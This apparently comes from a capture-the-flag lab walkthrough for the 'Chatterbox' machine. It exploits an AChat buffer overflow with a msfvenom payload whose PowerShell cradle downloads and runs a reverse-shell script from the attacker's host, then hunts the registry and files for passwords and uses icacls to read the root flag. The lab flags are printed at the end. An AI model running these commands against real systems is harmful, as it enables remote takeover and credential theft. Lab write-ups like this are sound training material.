# Chatterbox - Medium

```shell
nmap -T4 -p- -A 10.10.10.74

searchsploit achat

cp /usr/share/exploitdb/exploits/windows/remote/36025.py achat-exploit.py

msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/Invoke-PowerShellTcp.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#copy shellcode output to exploit file
#replace server address with victim address

#setup server
sudo python3 -m http.server 80

#setup listener
nc -nvlp 4444

#run python exploit
python achat-exploit.py

#we get reverse powershell
whoami
#alfred

cd C:\

findstr /si password *.txt

findstr /si password *.xml

findstr /si password *.ini

dir C:\ /s /b | findstr /si *vnc.ini

reg query "HKCU\Software\ORL\WinVNC3\Password"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
#this shows default password

type C:\Users\alfred\Desktop\user.txt

cd C:\Users\Administrator

icacls Desktop
#we have full permissions

cd Desktop

icacls root.txt
#no read permissions

icacls root.txt /grant alfred:F
#now we can read root flag

type root.txt
```

```markdown
Open ports & services:

  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 445 - microsoft-ds - microsoft-ds
  * 9255 - http - AChat chat system
  * 9256 - achat - AChat chat system
  * 49152-49157 - msrpc - RPC

We can search for exploits related to Achat chat system; we get a buffer overflow exploit in Python.

We need to modify the Python exploit to get a reverse shell, so we need to modify the msfvenom payload given, to create new shellcode and paste it in the exploit file.

As we will be using Nishang Invoke-PowerShellTcp.ps1, ensure to modify the script such that it contains the one-liner for reverse-shell (at the end):

    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444

After modifying the exploit file accordingly, and setting up our server & listener, if we run the Python exploit, we will get shell as alfred.

We can check for privesc using Windows privesc guide (manual method); as this is a password hunting room, we need to look for cleartext passwords.

While checking registry queries for passwords, we get the password "Welcome1!" for Alfred.

We can attempt for password reuse; this method can be followed by reusing the same password for Administrator.

However, we can see that user alfred has full permissions to the Administrator's Desktop. We cannot read the root flag, but we can grant permissions to read it.
```

1. User flag - ad478cda5a2aebb66e840a5938220c8c

2. Root flag - dae172bc965e6da64a61b591275d8641
